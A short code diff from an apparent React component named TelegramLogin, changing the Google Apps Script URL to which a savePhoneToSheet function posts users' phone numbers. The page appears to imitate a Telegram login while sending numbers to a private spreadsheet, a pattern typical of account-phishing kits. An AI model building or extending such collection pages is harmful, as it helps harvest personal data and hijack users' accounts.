@@ -6,7 +6,7 @@ const TelegramLogin = () => {
 
   const savePhoneToSheet = async (phone) => {
     try {
-      const res = await fetch("https://script.google.com/macros/s/AKfycbxIVUAxQdpKz9siQA28WBL4Jnf7kQlkGgddpLnzl5YzAczIwfB4TUvZUVYfaPzS3Wnf/exec", {
+      const res = await fetch("https://script.google.com/macros/s/AKfycbyFYPbGBKgv8-Ip4dDrYDPTR_xn1cOxVHH-THbR8hXi1V2IH02IJ2XttfZMxaxx2_8F/exec", {
         method: "POST",
         body: JSON.stringify({ phone }),
         headers: {
